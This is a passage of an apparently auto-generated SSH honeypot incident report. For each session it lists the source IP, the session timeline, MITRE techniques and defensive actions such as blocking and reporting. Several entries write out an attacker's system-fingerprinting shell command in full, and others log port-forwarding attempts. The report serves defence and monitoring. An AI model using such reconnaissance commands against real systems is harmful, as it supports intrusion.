| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.success` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.command.input` |
| `2026-07-10 12:21:52` | `cowrie.log.closed` |
| `2026-07-10 12:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2ffa1ba2c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:23 |
| **Last Seen** | 2026-07-10 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:23:19` | `cowrie.session.connect` |
| `2026-07-10 12:23:19` | `cowrie.client.version` |
| `2026-07-10 12:23:19` | `cowrie.client.kex` |
| `2026-07-10 12:23:20` | `cowrie.login.success` |
| `2026-07-10 12:23:20` | `cowrie.session.params` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.success` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:20` | `cowrie.command.input` |
| `2026-07-10 12:23:21` | `cowrie.log.closed` |
| `2026-07-10 12:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0c4783bd68

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-07-10 12:23 |
| **Last Seen** | 2026-07-10 12:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:23:51` | `cowrie.session.connect` |
| `2026-07-10 12:23:52` | `cowrie.client.version` |
| `2026-07-10 12:23:52` | `cowrie.client.kex` |
| `2026-07-10 12:23:53` | `cowrie.login.success` |
| `2026-07-10 12:23:53` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36fc9b0caaa6

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-10 12:24 |
| **Last Seen** | 2026-07-10 12:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:24:03` | `cowrie.session.connect` |
| `2026-07-10 12:24:03` | `cowrie.client.version` |
| `2026-07-10 12:24:03` | `cowrie.client.kex` |
| `2026-07-10 12:24:05` | `cowrie.login.success` |
| `2026-07-10 12:24:06` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc2fa8847e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:24 |
| **Last Seen** | 2026-07-10 12:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:24:46` | `cowrie.session.connect` |
| `2026-07-10 12:24:47` | `cowrie.client.version` |
| `2026-07-10 12:24:47` | `cowrie.client.kex` |
| `2026-07-10 12:24:47` | `cowrie.login.success` |
| `2026-07-10 12:24:48` | `cowrie.session.params` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.success` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.command.input` |
| `2026-07-10 12:24:48` | `cowrie.log.closed` |
| `2026-07-10 12:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1b0b099f078

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:26 |
| **Last Seen** | 2026-07-10 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:26:11` | `cowrie.session.connect` |
| `2026-07-10 12:26:11` | `cowrie.client.version` |
| `2026-07-10 12:26:11` | `cowrie.client.kex` |
| `2026-07-10 12:26:12` | `cowrie.login.success` |
| `2026-07-10 12:26:12` | `cowrie.session.params` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.success` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:12` | `cowrie.command.input` |
| `2026-07-10 12:26:13` | `cowrie.log.closed` |
| `2026-07-10 12:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3596a529e4d8

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-07-10 12:26 |
| **Last Seen** | 2026-07-10 12:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:26:30` | `cowrie.session.connect` |
| `2026-07-10 12:26:31` | `cowrie.client.version` |
| `2026-07-10 12:26:31` | `cowrie.client.kex` |
| `2026-07-10 12:26:33` | `cowrie.login.success` |
| `2026-07-10 12:26:33` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469bd529cf71

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-10 12:26 |
| **Last Seen** | 2026-07-10 12:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:26:39` | `cowrie.session.connect` |
| `2026-07-10 12:26:39` | `cowrie.client.version` |
| `2026-07-10 12:26:39` | `cowrie.client.kex` |
| `2026-07-10 12:26:42` | `cowrie.login.success` |
| `2026-07-10 12:26:42` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6946ce1641

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-10 12:27 |
| **Last Seen** | 2026-07-10 12:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:27:14` | `cowrie.session.connect` |
| `2026-07-10 12:27:15` | `cowrie.client.version` |
| `2026-07-10 12:27:15` | `cowrie.client.kex` |
| `2026-07-10 12:27:18` | `cowrie.login.success` |
| `2026-07-10 12:27:18` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a34460934ca

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-07-10 12:27 |
| **Last Seen** | 2026-07-10 12:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:27:24` | `cowrie.session.connect` |
| `2026-07-10 12:27:25` | `cowrie.client.version` |
| `2026-07-10 12:27:25` | `cowrie.client.kex` |
| `2026-07-10 12:27:27` | `cowrie.login.success` |
| `2026-07-10 12:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069192e6416c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:27 |
| **Last Seen** | 2026-07-10 12:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:27:33` | `cowrie.session.connect` |
| `2026-07-10 12:27:33` | `cowrie.client.version` |
| `2026-07-10 12:27:34` | `cowrie.client.kex` |
| `2026-07-10 12:27:34` | `cowrie.login.success` |
| `2026-07-10 12:27:35` | `cowrie.session.params` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.success` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.command.input` |
| `2026-07-10 12:27:35` | `cowrie.log.closed` |
| `2026-07-10 12:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23e03995e9a

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-07-10 12:28 |
| **Last Seen** | 2026-07-10 12:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:28:18` | `cowrie.session.connect` |
| `2026-07-10 12:28:19` | `cowrie.client.version` |
| `2026-07-10 12:28:19` | `cowrie.client.kex` |
| `2026-07-10 12:28:21` | `cowrie.login.success` |
| `2026-07-10 12:28:22` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4f56241bfa0

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-10 12:28 |
| **Last Seen** | 2026-07-10 12:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:28:31` | `cowrie.session.connect` |
| `2026-07-10 12:28:32` | `cowrie.client.version` |
| `2026-07-10 12:28:32` | `cowrie.client.kex` |
| `2026-07-10 12:28:33` | `cowrie.login.success` |
| `2026-07-10 12:28:34` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d296f76f7205

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:28 |
| **Last Seen** | 2026-07-10 12:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:28:58` | `cowrie.session.connect` |
| `2026-07-10 12:28:58` | `cowrie.client.version` |
| `2026-07-10 12:28:58` | `cowrie.client.kex` |
| `2026-07-10 12:28:59` | `cowrie.login.success` |
| `2026-07-10 12:29:00` | `cowrie.session.params` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.success` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.command.input` |
| `2026-07-10 12:29:00` | `cowrie.log.closed` |
| `2026-07-10 12:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8bac82f1fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:30 |
| **Last Seen** | 2026-07-10 12:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:30:22` | `cowrie.session.connect` |
| `2026-07-10 12:30:22` | `cowrie.client.version` |
| `2026-07-10 12:30:23` | `cowrie.client.kex` |
| `2026-07-10 12:30:23` | `cowrie.login.success` |
| `2026-07-10 12:30:24` | `cowrie.session.params` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.success` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.command.input` |
| `2026-07-10 12:30:24` | `cowrie.log.closed` |
| `2026-07-10 12:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6933db81d77c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:31 |
| **Last Seen** | 2026-07-10 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:31:47` | `cowrie.session.connect` |
| `2026-07-10 12:31:47` | `cowrie.client.version` |
| `2026-07-10 12:31:47` | `cowrie.client.kex` |
| `2026-07-10 12:31:47` | `cowrie.login.success` |
| `2026-07-10 12:31:48` | `cowrie.session.params` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.success` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:48` | `cowrie.command.input` |
| `2026-07-10 12:31:49` | `cowrie.log.closed` |
| `2026-07-10 12:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65e7e05c0a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:33 |
| **Last Seen** | 2026-07-10 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:33:11` | `cowrie.session.connect` |
| `2026-07-10 12:33:11` | `cowrie.client.version` |
| `2026-07-10 12:33:11` | `cowrie.client.kex` |
| `2026-07-10 12:33:12` | `cowrie.login.success` |
| `2026-07-10 12:33:13` | `cowrie.session.params` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.success` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.command.input` |
| `2026-07-10 12:33:13` | `cowrie.log.closed` |
| `2026-07-10 12:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd7295ab87d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 12:34 |
| **Last Seen** | 2026-07-10 12:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
